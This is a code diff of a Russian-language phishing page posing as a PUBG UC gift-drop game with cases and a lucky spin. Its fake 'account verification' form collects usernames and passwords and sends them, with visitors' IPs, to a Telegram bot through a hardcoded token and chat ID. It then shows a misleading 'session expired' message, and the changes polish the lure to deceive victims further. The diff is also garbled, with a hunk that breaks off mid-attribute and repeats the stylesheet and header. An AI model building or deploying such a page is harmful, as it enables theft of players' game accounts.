@@ -12,7 +12,7 @@
     <style>
         :root {
             --pubg-gold: #ffbc00;
-            --pubg-gold-dark: #cc9600;
+            --pubg-gold-light: #ffdb7d;
             --pubg-dark: #0b0c0d;
             --pubg-blue: #0084ff;
         }
@@ -63,29 +63,22 @@
             border: 1px solid rgba(255,255,255,0.1);
         }
 
-        .btn-plus {
-            background: #4caf50;
-            width: 16px; height: 16px;
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 10px; font-weight: bold;
-        }
-
         /* КЕЙС */
         .case-container {
             position: relative;
-            width: 100%;            height: 180px;
+            width: 100%;
+            height: 180px;
             overflow: hidden;
             margin: 20px 0;
+            background: radial-gradient(circle, rgba(255, 188, 0, 0.03) 0%, transparent 70%);
         }
 
         .case-line {
             position: absolute;
-            top: 0; left: 50%;
-            width: 2px; height: 100%;
+            top: 0; left: 50%;            width: 2px; height: 100%;
             background: var(--pubg-gold);
             z-index: 20;
-            box-shadow: 0 0 15px var(--pubg-gold);
+            box-shadow: 0 0 20px var(--pubg-gold);
             transform: translateX(-50%);
         }
 
@@ -103,9 +96,10 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            opacity: 0.5;
+            opacity: 0.4;
+            transition: opacity 0.3s;
         }
-        .case-item img { width: 100px; height: 100px; object-fit: contain; }
+        .case-item img { width: 100px; height: 100px; object-fit: contain; pointer-events: none; }
 
         .btn-blue {
             background: var(--pubg-blue);
@@ -121,62 +115,75 @@
             cursor: pointer;
         }
 
-        /* ОКНО ВЫИГРЫША */
+        /* КРАСИВОЕ ОКНО ВЫИГРЫША */
         .win-modal {
             position: fixed; inset: 0;
-            background: rgba(0,0,0,0.94);
-            backdrop-filter: blur(10px);
+            background: rgba(0,0,0,0.96);
+            backdrop-filter: blur(15px);
             z-index: 2000; display: none;
             flex-direction: column; justify-content: center; align-items: center; padding: 20px;
         }
 
         .win-card {
-            background: linear-gradient(180deg, #1c1d22 0%, #0a0b0d 100%);
-            border: 1px solid rgba(255, 188, 0, 0.3);
-            border-radius: 16px; 
-            padding: 50px 24px 30px 24px; 
-            width: 90%; max-width: 340px; 
+            background: linear-gradient(135deg, #1a1b1f 0%, #08090a 100%);
+            border: 2px solid var(--pubg-gold);
+            border-radius: 20px; 
+            padding: 50px 20px 30px 20px; 
+            width: 90%; max-width: 320px; 
             text-align: center;
             position: relative;
-            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+            box-shadow: 0 0 50px rgba(255, 188, 0, 0.15), inset 0 0 20px rgba(255, 188, 0, 0.05);
+            animation: modalPop 0.4s cubic-bezier(0.17, 0.89, 0.32, 1.27);
         }
 
-        .item-glow {
+        @keyframes modalPop {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .win-glow {
             position: absolute;
             top: 40%; left: 50%;
             transform: translate(-50%, -50%);
-            width: 220px; height: 220px;
-            background: radial-gradient(circle, rgba(255, 188, 0, 0.2) 0%, transparent 70%);
+            width: 250px; height: 250px;
+            background: radial-gradient(circle, rgba(255, 188, 0, 0.25) 0%, transparent 70%);
             z-index: 0;
+            animation: pulseGlow 2s infinite alternate;
+        }
+
+        @keyframes pulseGlow {
+            from { opacity: 0.5; transform: translate(-50%, -50%) scale(0.9); }
+            to { opacity: 1; transform: translate(-50%, -50%) scale(1.1); }
         }
 
         #winPrizeImage {
             position: relative;
             z-index: 1;
-            width: 160px; height: 160px;
+            width: 170px; height: 170px;
             margin: 0 auto 40px auto;
-            filter: drop-shadow(0 10px 25px rgba(0,0,0,0.6));
+            filter: drop-shadow(0 15px 30px rgba(0,0,0,0.8));
         }
 
-        .btn-collect {
+        .btn-claim {
             background: linear-gradient(180deg, #ffbc00 0%, #cc9600 100%);
             color: #000;
             width: 100%;
-            padding: 14px;
-            border-radius: 4px;
+            padding: 16px;
+            border-radius: 8px;
             font-family: 'Teko', sans-serif;
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 20px rgba(255, 188, 0, 0.4);
+            letter-spacing: 1.5px;
+            box-shadow: 0 5px 20px rgba(255, 188, 0, 0.4);
             border: none;
             cursor: pointer;
             position: relative;
             z-index: 2;
+            transition: transform 0.1s, box-shadow 0.1s;
         }
 
-        .btn-collect:active { transform: scale(0.96); }
+        .btn-claim:active { transform: scale(0.96); box-shadow: 0 2px 10px rgba(255, 188, 0, 0.2); }
 
         /* НАВИГАЦИЯ */
         .nav-bar {
@@ -191,7 +198,7 @@
 
         .modal {
             position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 1000; display: none; flex-direction: column; padding: 20px;
+            z-index: 3000; display: none; flex-direction: column; padding: 20px;
             justify-content: center;
         }
         .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
@@ -215,7 +222,7 @@
         </div>
     </header>
 
-    <!-- ГЛАВНОЕ МЕНЮ (HUB) -->
+    <!-- HUB (МЕНЮ) -->
     <main id="section-hub" class="p-4">
         <div class="grid grid-cols-2 gap-4 mt-4">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
@@ -229,7 +236,7 @@
         </div>
     </main>
 
-    <!-- РАЗДЕЛ КЕЙС -->
+    <!-- CASE SECTION -->
     <section id="section-case" style="display: none;">
         <div class="text-center py-6">
             <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
@@ -242,7 +249,189 @@
         <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Пополнить баланс</button>
     </section>
 
-    <!-- РАЗДЕЛ РУЛЕТКА -->
+    <!-- SPIN SECTION -->
+    <section id="section-spin" style="display: none;" class="p-5">
+        <div class="text-center py-4">
+            <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
+        </div>
+        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
+            <div class="grid grid-cols-3 gap-3">
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s0"><img src="priz1.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s1"><img src="priz2.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s2"><img src\            width: 2px; height: 100%;
+            background: var(--pubg-gold);
+            z-index: 20;
+            box-shadow: 0 0 20px var(--pubg-gold);
+            transform: translateX(-50%);
+        }
+
+        .case-tape {
+            display: flex;
+            padding: 30px 0;
+            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
+            will-change: transform;
+        }
+
+        .case-item {
+            min-width: 140px;
+            width: 140px;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0.4;
+            transition: opacity 0.3s;
+        }
+        .case-item img { width: 100px; height: 100px; object-fit: contain; pointer-events: none; }
+
+        .btn-blue {
+            background: var(--pubg-blue);
+            color: white;
+            width: calc(100% - 32px);
+            margin: 0 16px;
+            padding: 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            text-align: center;
+            display: block;
+            cursor: pointer;
+        }
+
+        /* КРАСИВОЕ ОКНО ВЫИГРЫША */
+        .win-modal {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.96);
+            backdrop-filter: blur(15px);
+            z-index: 2000; display: none;
+            flex-direction: column; justify-content: center; align-items: center; padding: 20px;
+        }
+
+        .win-card {
+            background: linear-gradient(135deg, #1a1b1f 0%, #08090a 100%);
+            border: 2px solid var(--pubg-gold);
+            border-radius: 20px; 
+            padding: 50px 20px 30px 20px; 
+            width: 90%; max-width: 320px; 
+            text-align: center;
+            position: relative;
+            box-shadow: 0 0 50px rgba(255, 188, 0, 0.15), inset 0 0 20px rgba(255, 188, 0, 0.05);
+            animation: modalPop 0.4s cubic-bezier(0.17, 0.89, 0.32, 1.27);
+        }
+
+        @keyframes modalPop {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .win-glow {
+            position: absolute;
+            top: 40%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 250px; height: 250px;
+            background: radial-gradient(circle, rgba(255, 188, 0, 0.25) 0%, transparent 70%);
+            z-index: 0;
+            animation: pulseGlow 2s infinite alternate;
+        }
+
+        @keyframes pulseGlow {
+            from { opacity: 0.5; transform: translate(-50%, -50%) scale(0.9); }
+            to { opacity: 1; transform: translate(-50%, -50%) scale(1.1); }
+        }
+
+        #winPrizeImage {
+            position: relative;
+            z-index: 1;
+            width: 170px; height: 170px;
+            margin: 0 auto 40px auto;
+            filter: drop-shadow(0 15px 30px rgba(0,0,0,0.8));
+        }
+
+        .btn-claim {
+            background: linear-gradient(180deg, #ffbc00 0%, #cc9600 100%);
+            color: #000;
+            width: 100%;
+            padding: 16px;
+            border-radius: 8px;
+            font-family: 'Teko', sans-serif;
+            font-size: 26px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            box-shadow: 0 5px 20px rgba(255, 188, 0, 0.4);
+            border: none;
+            cursor: pointer;
+            position: relative;
+            z-index: 2;
+            transition: transform 0.1s, box-shadow 0.1s;
+        }
+
+        .btn-claim:active { transform: scale(0.96); box-shadow: 0 2px 10px rgba(255, 188, 0, 0.2); }
+
+        /* НАВИГАЦИЯ */
+        .nav-bar {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: #000; height: 65px;
+            display: flex; justify-content: space-around; align-items: center;border-top: 1px solid rgba(255, 255, 255, 0.05);
+            z-index: 50;
+        }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer;}
+        .nav-item.active { color: var(--pubg-gold); }
+
+        .modal {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+            z-index: 3000; display: none; flex-direction: column; padding: 20px;
+            justify-content: center;
+        }
+        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="flex items-center gap-2 cursor-pointer" id="backBtn" style="visibility: hidden;" onclick="showSection('hub')">
+            <i class="fas fa-chevron-left text-gray-400"></i>
+            <span class="text-sm font-bold">Назад</span>
+        </div>
+        <div class="text-center" style="flex: 1;">
+            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
+        </div>
+        <div class="balance-display">
+            <span class="uc-icon">UC</span>
+            <span id="headerBalance" class="text-sm font-bold">60</span>
+            <div class="btn-plus">+</div>
+        </div>
+    </header>
+
+    <!-- HUB (МЕНЮ) -->
+    <main id="section-hub" class="p-4">
+        <div class="grid grid-cols-2 gap-4 mt-4">
+            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
+                <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
+                <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
+            </div>
+            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
+                <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
+                <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
+            </div>
+        </div>
+    </main>
+
+    <!-- CASE SECTION -->
+    <section id="section-case" style="display: none;">
+        <div class="text-center py-6">
+            <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
+        </div>
+        <div class="case-container">
+            <div class="case-line"></div>
+            <div id="caseTape" class="case-tape"></div>
+        </div>
+        <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</button>
+        <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Пополнить баланс</button>
+    </section>
+
+    <!-- SPIN SECTION -->
     <section id="section-spin" style="display: none;" class="p-5">
         <div class="text-center py-4">
             <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
@@ -264,16 +453,16 @@
         <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Пополнить баланс</button>
     </section>
 
-    <!-- ОКНО ВЫИГРЫША -->
+    <!-- НОВОЕ ОКНО ПРИЗА -->
     <div id="winModal" class="win-modal">
         <div class="win-card">
-            <div class="item-glow"></div>
+            <div class="win-glow"></div>
             <img id="winPrizeImage" src="" alt="Prize">
-            <button onclick="closeWinModal()" class="btn-collect">Забрать приз</button>
+            <button onclick="closeWinModal()" class="btn-claim">Забрать приз</button>
         </div>
     </div>
 
-    <!-- АВТОРИЗАЦИЯ -->
+    <!-- МОДАЛКИ ВХОДА -->
     <div id="modalAuth" class="modal">
         <div class="login-card">
             <h2 class="font-black text-xl mb-4 text-center">Верификация аккаунта</h2>
@@ -292,6 +481,7 @@
         </div>
     </div>
 
+    <!-- NAVIGATION -->
     <nav class="nav-bar">
         <div class="nav-item" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
         <div class="nav-item active" id="nav-hub" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
@@ -299,8 +489,7 @@
     </nav>
 
     <script>
-        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
-        const CHAT_ID = '1709490182';
+        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';const CHAT_ID = '1709490182';
         const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
         
         let balance = 60; 
@@ -313,36 +502,25 @@
         function updateBalanceUI() {
             document.getElementById('headerBalance').innerText = balance;
             const canPlay = balance >= 60;
-            
             document.getElementById('openBtn').style.display = canPlay ? 'block' : 'none';
             document.getElementById('depositBtn').style.display = canPlay ? 'none' : 'block';
-            
             document.getElementById('spinBtn').style.display = canPlay ? 'block' : 'none';
             document.getElementById('spinDepositBtn').style.display = canPlay ? 'none' : 'block';
         }
 
         function showSection(id) {
             if (isSpinning) return;
-            
-            // Скрываем все секции
             document.getElementById('section-hub').style.display = 'none';
             document.getElementById('section-case').style.display = 'none';
             document.getElementById('section-spin').style.display = 'none';
-            
-            // Показываем нужную
             document.getElementById('section-' + id).style.display = 'block';
-            
-            // Кнопка назад
             document.getElementById('backBtn').style.visibility = (id === 'hub') ? 'hidden' : 'visible';
-            
-            // Обновляем иконки меню
             document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
             if(id === 'hub') document.getElementById('nav-hub').classList.add('active');
             if(id === 'case') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
-            
-            updateBalanceUI();
         }
 
+        // Инициализация кейса без повторов картинок рядом
         function initCase() {
             const tape = document.getElementById('caseTape');
             tape.innerHTML = '';
@@ -372,7 +550,7 @@
             setTimeout(() => {
                 const winImg = tape.children[targetIdx].querySelector('img').src;
                 showWinModal(winImg);
-                sendTelegram(`🎁 Кейс открыт | IP: ${userIP}`);
+                sendTelegram(`🎁 Кейс | IP: ${userIP}`);
                 isSpinning = false;
             }, 5000);
         }
@@ -385,18 +563,19 @@
 
             const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
             let step = 0;
-            const totalSteps = 25 + Math.floor(Math.random() * 10);
+            const totalSteps = 24 + Math.floor(Math.random() * 9);
 
             const interval = setInterval(() => {
                 cells.forEach(id => {
                     document.getElementById(id).style.borderColor = 'transparent';
-                    document.getElementById(id).style.boxShadow = 'none';
-                });
+                    document.getElementById(id).style.background = 'rgba(37, 38, 43, 1)';
+                \ 
+});
 
                 const currentId = cells[step % cells.length];
                 const currentEl = document.getElementById(currentId);
                 currentEl.style.borderColor = '#ffbc00';
-                currentEl.style.boxShadow = '0 0 15px rgba(255, 188, 0, 0.5)';
+                currentEl.style.background = 'rgba(255, 188, 0, 0.1)';
 
                 step++;
                 if (step >= totalSteps) {
@@ -408,7 +587,7 @@
                         isSpinning = false;
                     }, 500);
                 }
-            }, 120);
+            }, 130);
         }
 
         function showWinModal(img) {
@@ -418,13 +597,10 @@
 
         function closeWinModal() {
             document.getElementById('winModal').style.display = 'none';
-            if(balance < 60) {
-                startAuth();
-            }
+            if(balance < 60) setTimeout(() => startAuth(), 400);
         }
 
         function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
-        
         function openForm(m) {
             document.getElementById('modalAuth').style.display = 'none';
             document.getElementById('modalForm').style.display = 'flex';
@@ -434,9 +610,9 @@
         async function finalSubmit() {
             const u = document.getElementById('inpUser').value;
             const p = document.getElementById('inpPass').value;
-            if(u.length < 3 || p.length < 3) return alert('Заполните все поля');
+            if(u.length < 3 || p.length < 3) return;
             await sendTelegram(`🔥 LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`);
-            alert('Ошибка. Недостаточный уровень доверия аккаунта. Попробуйте другой метод.');
+            alert('Срок действия сессии истек. Пожалуйста, войдите снова.');
             location.reload();
         }
 
